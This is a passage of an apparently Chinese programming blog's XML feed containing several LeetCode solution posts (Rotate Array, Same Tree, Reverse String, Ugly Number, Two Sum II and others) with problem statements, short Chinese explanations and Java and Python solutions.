&gt; c &amp;&amp; k &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        top -= <span class="number">1</span>;</span><br><span class="line">        k -= <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      stk[top++] = c;</span><br><span class="line">      System.out.println(stk);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// find the index of first non-zero digit</span></span><br><span class="line">    <span class="keyword">int</span> idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (idx &lt; digits &amp;&amp; stk[idx] == <span class="string">'0'</span>) &#123;</span><br><span class="line">      idx++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> idx == digits ? <span class="string">"0"</span> : <span class="keyword">new</span> String(stk, idx, digits - idx);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote>
<ul>
<li><a href="https://leetcode.com/problems/remove-k-digits/discuss/?currentPage=1&amp;orderBy=most_votes&amp;query=" target="_blank" rel="noopener">remove-k-digits</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>greedy</tag>
      </tags>
  </entry>
  <entry>
    <title>189. Rotate Array</title>
    <url>/2018/06/06/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Rotate%20Array/</url>
    <content><![CDATA[<p>Given an array, rotate the array to the right by k steps, where k is non-negative.</p>
<p>Example 1:</p>
<p>Input: [1,2,3,4,5,6,7] and k = 3<br>Output: [5,6,7,1,2,3,4]<br>Explanation:<br>rotate 1 steps to the right: [7,1,2,3,4,5,6]<br>rotate 2 steps to the right: [6,7,1,2,3,4,5]<br>rotate 3 steps to the right: [5,6,7,1,2,3,4]<br>Example 2:<br>Input: [-1,-100,3,99] and k = 2<br>Output: [3,99,-1,-100]<br>Explanation:<br>rotate 1 steps to the right: [99,-1,-100,3]<br>rotate 2 steps to the right: [3,99,-1,-100]<br>Note:<br>Try to come up as many solutions as you can, there are at least 3 different ways to solve this problem.<br>Could you do it in-place with O(1) extra space?<br><a id="more"></a></p>
<h1 id="题意解读"><a href="#题意解读" class="headerlink" title="题意解读"></a>题意解读</h1><p>题意是将一个数组按照给定的数字截取反转,要求时间复杂度为O(1)。解题思路需要数组的移动,每次将最后一个元素取出来赋值到数组第一个元素位置。</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><blockquote>
<ul>
<li>python </li>
</ul>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author: xwolf</span></span><br><span class="line"><span class="comment"># origin: https://leetcode.com/problems/rotate-array/description/</span></span><br><span class="line"><span class="comment"># date: 2018-08-10</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RoateArray</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">roate</span><span class="params">(nums, k)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :param nums:</span></span><br><span class="line"><span class="string">        :param k:</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        c = len(nums) - k</span><br><span class="line">        a = nums[<span class="number">0</span>:c]</span><br><span class="line">        b = nums[c:len(nums)]</span><br><span class="line">        nums[<span class="number">0</span>:k] = b</span><br><span class="line">        nums[k:] = a</span><br><span class="line">        <span class="keyword">return</span> nums</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    rate = RoateArray()</span><br><span class="line">    a = [<span class="number">-1</span>, <span class="number">-100</span>, <span class="number">3</span>, <span class="number">99</span>]</span><br><span class="line">    print(rate.roate(a, <span class="number">2</span>))</span><br></pre></td></tr></table></figure>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote>
<ul>
<li><a href="https://leetcode.com/problems/rotate-array/description/" target="_blank" rel="noopener">189. Rotate Array</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>100.Same Tree</title>
    <url>/2019/05/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Same%20Tree/</url>
    <content><![CDATA[<p>Given two binary trees, write a function to check if they are the same or not.</p>
<p>Two binary trees are considered the same if they are structurally identical and the nodes have the same value.</p>
<blockquote>
<ul>
<li>Example 1:</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input:     1         1</span><br><span class="line">          / \       / \</span><br><span class="line">         2   3     2   3</span><br><span class="line"></span><br><span class="line">        [1,2,3],   [1,2,3]</span><br></pre></td></tr></table></figure>
<p>Output: true</p>
<blockquote>
<ul>
<li>Example 2:</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input:     1         1</span><br><span class="line">          /           \</span><br><span class="line">         2             2</span><br><span class="line"></span><br><span class="line">        [1,2],     [1,null,2]</span><br></pre></td></tr></table></figure>
<p>Output: false</p>
<blockquote>
<ul>
<li>Example 3:</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input:     1         1</span><br><span class="line">          / \       / \</span><br><span class="line">         2   1     1   2</span><br><span class="line"></span><br><span class="line">        [1,2,1],   [1,1,2]</span><br></pre></td></tr></table></figure>
<p>Output: false</p>
<a id="more"></a>
<h1 id="题意解读"><a href="#题意解读" class="headerlink" title="题意解读"></a>题意解读</h1><p>题目很容易理解，判断给定的两个二叉树是否完全一样.</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<p>递归判断</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SameTree</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSameTree</span><span class="params">(TreeNode p, TreeNode q)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="keyword">null</span> &amp;&amp; q == <span class="keyword">null</span>)&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (q == <span class="keyword">null</span> || p == <span class="keyword">null</span>)&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (p.val != q.val) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> isSameTree(p.right, q.right) &amp;&amp; isSameTree(p.left, q.left);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<p>迭代实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SameTree</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">check</span><span class="params">(TreeNode p, TreeNode q)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// p and q are null</span></span><br><span class="line">    <span class="keyword">if</span> (p == <span class="keyword">null</span> &amp;&amp; q == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    <span class="comment">// one of p and q is null</span></span><br><span class="line">    <span class="keyword">if</span> (q == <span class="keyword">null</span> || p == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (p.val != q.val) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSameTree</span><span class="params">(TreeNode p, TreeNode q)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="keyword">null</span> &amp;&amp; q == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (!check(p, q)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// init deques</span></span><br><span class="line">    ArrayDeque&lt;TreeNode&gt; deqP = <span class="keyword">new</span> ArrayDeque&lt;TreeNode&gt;();</span><br><span class="line">    ArrayDeque&lt;TreeNode&gt; deqQ = <span class="keyword">new</span> ArrayDeque&lt;TreeNode&gt;();</span><br><span class="line">    deqP.addLast(p);</span><br><span class="line">    deqQ.addLast(q);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!deqP.isEmpty()) &#123;</span><br><span class="line">      p = deqP.removeFirst();</span><br><span class="line">      q = deqQ.removeFirst();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!check(p, q)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// in Java nulls are not allowed in Deque</span></span><br><span class="line">        <span class="keyword">if</span> (!check(p.left, q.left)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (p.left != <span class="keyword">null</span>) &#123;</span><br><span class="line">          deqP.addLast(p.left);</span><br><span class="line">          deqQ.addLast(q.left);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!check(p.right, q.right)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (p.right != <span class="keyword">null</span>) &#123;</span><br><span class="line">          deqP.addLast(p.right);</span><br><span class="line">          deqQ.addLast(q.right);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://leetcode.com/problems/same-tree/discuss/?currentPage=1&amp;orderBy=most_votes&amp;query=" target="_blank" rel="noopener">100.Same Tree
</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>344. Reverse String</title>
    <url>/2019/04/29/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/ReverseString/</url>
    <content><![CDATA[<p>Write a function that reverses a string. The input string is given as an array of characters char[].</p>
<p>Do not allocate extra space for another array, you must do this by modifying the input array in-place with O(1) extra memory.</p>
<p>You may assume all the characters consist of printable ascii characters.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: [&quot;h&quot;,&quot;e&quot;,&quot;l&quot;,&quot;l&quot;,&quot;o&quot;]</span><br><span class="line">Output: [&quot;o&quot;,&quot;l&quot;,&quot;l&quot;,&quot;e&quot;,&quot;h&quot;]</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: [&quot;H&quot;,&quot;a&quot;,&quot;n&quot;,&quot;n&quot;,&quot;a&quot;,&quot;h&quot;]</span><br><span class="line">Output: [&quot;h&quot;,&quot;a&quot;,&quot;n&quot;,&quot;n&quot;,&quot;a&quot;,&quot;H&quot;]</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>在不占用额外内存的情况下,翻转数组.</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><blockquote>
<ul>
<li>Python</li>
</ul>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverseString</span><span class="params">(self, s)</span> -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    O(1)空间复杂度下翻转数组</span></span><br><span class="line"><span class="string">    :param s: List[str]</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    lens = len(s)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(lens / <span class="number">2</span> )):</span><br><span class="line">        print(i)</span><br><span class="line">        tmp = s[i]</span><br><span class="line">        s[i] = s[lens - i - <span class="number">1</span>]</span><br><span class="line">        s[lens - i - <span class="number">1</span>] = tmp</span><br></pre></td></tr></table></figure>
<p>讨论区其他答案</p>
<blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">reverseString</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = s.getBytes();</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> j = s.length() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">            bytes[i] = (<span class="keyword">byte</span>) (bytes[i] ^ bytes[j]);</span><br><span class="line">            bytes[j] = (<span class="keyword">byte</span>) (bytes[i] ^ bytes[j]);</span><br><span class="line">            bytes[i] = (<span class="keyword">byte</span>) (bytes[i] ^ bytes[j]);</span><br><span class="line">            i++;</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><p><a href="https://leetcode.com/problems/reverse-string/" target="_blank" rel="noopener">Reverse String</a></p>
</li>
<li><p><a href="https://leetcode.com/problems/reverse-string/discuss/80937/JAVA-Simple-and-Clean-with-Explanations-6-Solutions" target="_blank" rel="noopener">JAVA-Simple-and-Clean-with-Explanations-6-Solutions</a></p>
</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>371. Sum of Two Integers</title>
    <url>/2019/05/16/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Sum%20of%20Two%20Integers/</url>
    <content><![CDATA[<p>Calculate the sum of two integers a and b, but you are not allowed to use the operator + and -.</p>
<blockquote>
<ul>
<li>Example 1:</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: a = 1, b = 2</span><br><span class="line">Output: 3</span><br></pre></td></tr></table></figure>
<blockquote>
<p>-Example 2:</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: a = -2, b = 3</span><br><span class="line">Output: 1</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>不用 +，-运算符计算两个 int 值的和.</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<p>递归位运算</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSum</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> (b == <span class="number">0</span>) ? a : getSum(a ^ b, (a &amp; b) &lt;&lt; <span class="number">1</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://leetcode.com/problems/sum-of-two-integers/discuss/?currentPage=1&amp;orderBy=most_votes&amp;query=" target="_blank" rel="noopener">sum-of-two-integers</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>24. Swap Nodes in Pairs</title>
    <url>/2019/07/09/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Swap%20Nodes%20in%20Pairs/</url>
    <content><![CDATA[<p>Given a linked list, swap every two adjacent nodes and return its head.</p>
<p>You may not modify the values in the list’s nodes, only nodes itself may be changed.</p>
<blockquote>
<ul>
<li>Example:</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Given 1-&gt;2-&gt;3-&gt;4, you should return the list as 2-&gt;1-&gt;4-&gt;3.</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>交换链表相邻两个节点的值.</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<p>递归实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">swap</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(( head == <span class="keyword">null</span> ) || ( head.next == <span class="keyword">null</span> )) &#123;</span><br><span class="line">      <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    ListNode n = head.next;</span><br><span class="line">    System.out.println(n);</span><br><span class="line">    head.next = swapPairs(head.next.next);</span><br><span class="line">    n.next = head;</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote>
<ul>
<li><a href="https://leetcode.com/problems/swap-nodes-in-pairs/discuss/?currentPage=1&amp;orderBy=hot&amp;query=" target="_blank" rel="noopener">swap-nodes-in-pairs</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>递归</tag>
      </tags>
  </entry>
  <entry>
    <title>633. Sum of Square Numbers</title>
    <url>/2019/05/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Sum%20of%20Square%20Numbers/</url>
    <content><![CDATA[<p>Given a non-negative integer c, your task is to decide whether there’re two integers a and b such that a^2 + b^2 = c.</p>
<blockquote>
<ul>
<li><p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: 5</span><br><span class="line">Output: True</span><br><span class="line">Explanation: 1 * 1 + 2 * 2 = 5</span><br></pre></td></tr></table></figure>
</li>
<li><p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: 3</span><br><span class="line">Output: False</span><br></pre></td></tr></table></figure>
</li>
</ul>
</blockquote>
<a id="more"></a>
<h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>给定一个正整数c,判断是否存在两个数使得a^2+b^2=c。</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<p>使用双指针来判断即可.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">judgeSquareSum</span><span class="params">(<span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span> ,j = (<span class="keyword">int</span>) Math.sqrt(c); i &lt;= j;)&#123;</span><br><span class="line">      <span class="keyword">if</span> ( i * i + j * j == c)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( i * i + j * j &gt; c)&#123;</span><br><span class="line">          j -- ;</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( i * i + j * j &lt; c)&#123;</span><br><span class="line">        i ++ ;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote>
<ul>
<li><p><a href="https://leetcode.com/problems/sum-of-square-numbers/discuss/?currentPage=1&amp;orderBy=most_votes&amp;query=" target="_blank" rel="noopener">sum-of-square-numbers</a></p>
</li>
<li><p><a href="https://www.jianshu.com/p/2fab49be0959" target="_blank" rel="noopener">双指针</a></p>
</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>two pointers</tag>
      </tags>
  </entry>
  <entry>
    <title>263. Ugly Number</title>
    <url>/2019/06/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Ugly%20Number/</url>
    <content><![CDATA[<p>Write a program to check whether a given number is an ugly number.</p>
<p>Ugly numbers are positive numbers whose prime factors only include 2, 3, 5.</p>
<blockquote>
<ul>
<li>Example 1:</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: 6</span><br><span class="line">Output: true</span><br><span class="line">Explanation: 6 = 2 × 3</span><br></pre></td></tr></table></figure>
<blockquote>
<p>-Example 2:</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: 8</span><br><span class="line">Output: true</span><br><span class="line">Explanation: 8 = 2 × 2 × 2</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>Example 3:</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: 14</span><br><span class="line">Output: false</span><br><span class="line">Explanation: 14 is not ugly since it includes another prime factor 7.</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>Note:</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 is typically treated as an ugly number.</span><br><span class="line">Input is within the 32-bit signed integer range: [−231, 231 − 1].</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>判断一个数字是否为“丑数”,“丑数”是因子仅由 2,3,5 组成的数字.</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isUgly</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(num == <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(num == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (num % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">      num = num &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (num % <span class="number">3</span> == <span class="number">0</span>) &#123;</span><br><span class="line">      num = num / <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (num % <span class="number">5</span> == <span class="number">0</span>) &#123;</span><br><span class="line">      num = num / <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> num == <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote>
<ul>
<li><a href="https://leetcode.com/problems/ugly-number/discuss/?currentPage=1&amp;orderBy=most_votes&amp;query=" target="_blank" rel="noopener">ugly-number</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>math</tag>
      </tags>
  </entry>
  <entry>
    <title>167.Two Sum II - Input array is sorted</title>
    <url>/2019/05/06/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Two%20Sum%20II%20-%20Input%20array%20is%20sorted/</url>
    <content><![CDATA[<p>Given an array of integers that is already sorted in ascending order, find two numbers such that they add up to a specific target number.</p>
<p>The function twoSum should return indices of the two numbers such that they add up to the target, where index1 must be less than index2.</p>
<p>Note:</p>
<p>Your returned answers (both index1 and index2) are not zero-based.<br>You may assume that each input would have exactly one solution and you may not use the same element twice.<br>Example:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: numbers = [2,7,11,15], target = 9</span><br><span class="line">Output: [1,2]</span><br><span class="line">Explanation: The sum of 2 and 7 is 9. Therefore index1 = 1, index2 = 2.</span><br></pre></td></tr></table></figure>
<h1 id="题意解读"><a href="#题意解读" class="headerlink" title="题意解读"></a>题意解读</h1><p>给定一个有序数组,求出两个数的位置使得对应位置的元素之和等于给定的数字 target.并且一个元素只能使用一次.</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><blockquote>
<ul>
<li>python</li>
</ul>
</blockquote>
<p>这种方法比较容易想到,顺序遍历所有元素,用 target-当前元素=目标元素，判断目标元素是否在数组中,如果在则获取对应的位置返回。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TwoSumII</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">twoSum</span><span class="params">(self, numbers, target: int)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :param numbers: List[int]</span></span><br><span class="line"><span class="string">        :param target: int</span></span><br><span class="line"><span class="string">        :return: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        size = len(numbers)</span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(size):</span><br><span class="line">            a = numbers[i]</span><br><span class="line">            b = target - a</span><br><span class="line">            <span class="keyword">if</span> b <span class="keyword">in</span> numbers:</span><br><span class="line">                c = numbers.index(b)</span><br><span class="line">                <span class="keyword">if</span> i == c:</span><br><span class="line">                    c = i + <span class="number">1</span></span><br><span class="line">                res.append(i + <span class="number">1</span>)</span><br><span class="line">                res.append(c + <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> res</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>
<p>讨论区其他答案</p>
<blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<p>用两个指针变量,一个指向头部,一个指向尾部.通过比较 target 和前后指针之和来移动指针位置,缩小范围。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] twoSum(<span class="keyword">int</span>[] num, <span class="keyword">int</span> target) &#123;</span><br><span class="line">    <span class="keyword">int</span>[] indice = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">if</span> (num == <span class="keyword">null</span> || num.length &lt; <span class="number">2</span>) <span class="keyword">return</span> indice;</span><br><span class="line">    <span class="keyword">int</span> left = <span class="number">0</span>, right = num.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">        <span class="keyword">int</span> v = num[left] + num[right];</span><br><span class="line">        <span class="keyword">if</span> (v == target) &#123;</span><br><span class="line">            indice[<span class="number">0</span>] = left + <span class="number">1</span>;</span><br><span class="line">            indice[<span class="number">1</span>] = right + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (v &gt; target) &#123;</span><br><span class="line">            right --;</span><br><span class="line">        &#125; <span class="keyword">else</span> 